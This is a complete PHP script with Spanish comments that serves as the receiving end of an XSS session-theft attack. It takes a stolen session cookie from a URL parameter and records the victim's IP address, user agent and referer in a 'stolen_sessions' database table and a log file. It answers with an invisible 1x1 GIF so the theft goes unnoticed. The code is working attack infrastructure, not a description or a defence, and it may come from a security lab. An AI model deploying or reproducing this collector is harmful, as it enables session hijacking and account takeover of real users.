<?php
// Incluir configuración de base de datos
require_once '../config.php';

// Capturar datos de la sesión robada desde el ataque XSS

// 1. $cookie - Cookie de Sesión Robada:
$cookie = $_GET['cookie'] ?? '';
// Contiene:
// - PHPSESSID (identificador único de sesión)
// - Otros cookies de autenticación
// - Cookies de preferencias del usuario
// - Información de estado de la aplicación

// 2. $user_agent - Información del Navegador:
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
// Contiene:
// - Tipo de navegador (Chrome, Firefox, Safari, etc.)
// - Versión del navegador
// - Sistema operativo (Windows, Mac, Linux)
// - Arquitectura (32-bit, 64-bit)
// - Dispositivo (desktop, mobile)
// - Motor de renderizado (WebKit, Gecko, etc.)

// 3. $ip_address - Dirección IP de la Víctima:
$ip_address = $_SERVER['REMOTE_ADDR'] ?? '';
// Contiene:
// - IP pública de la víctima
// - Ubicación geográfica aproximada
// - Proveedor de internet (ISP)
// - Información de red local (si aplica)
// - Posible ubicación física

// 4. $referer - Página de Origen del Ataque:
$referer = $_SERVER['HTTP_REFERER'] ?? '';
// Contiene:
// - URL completa de la página donde se ejecutó el XSS
// - Parámetros de la URL
// - Contexto del ataque
// - Información sobre el flujo de navegación

// Guardar la sesión robada en la base de datos
if (!empty($cookie)) {
    try {
        // Insertar sesión robada en la tabla stolen_sessions
        $sql = "INSERT INTO stolen_sessions (session_cookie, user_agent, ip_address, referer) VALUES (?, ?, ?, ?)";
        $stmt = $conn->prepare($sql);
        $stmt->execute([$cookie, $user_agent, $ip_address, $referer]);
        
        // Guardar también en archivo de log como respaldo
        $log_entry = date('Y-m-d H:i:s') . " - IP: $ip_address - Cookie: $cookie - Referer: $referer\n";
        file_put_contents('stolen_sessions.log', $log_entry, FILE_APPEND | LOCK_EX);
        
    } catch (PDOException $e) {
        // Fallo silencioso - no revelar errores al atacante
        error_log("Error storing stolen session: " . $e->getMessage());
    }
}

// Devolver un pixel transparente 1x1 para evitar detección
header('Content-Type: image/gif');                    // Hacer creer que es una imagen
header('Cache-Control: no-cache, no-store, must-revalidate');  // No cachear
header('Pragma: no-cache');                           // No cachear en navegadores antiguos
header('Expires: 0');                                 // Expirar inmediatamente

// Imagen GIF transparente 1x1 (pixel invisible)
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
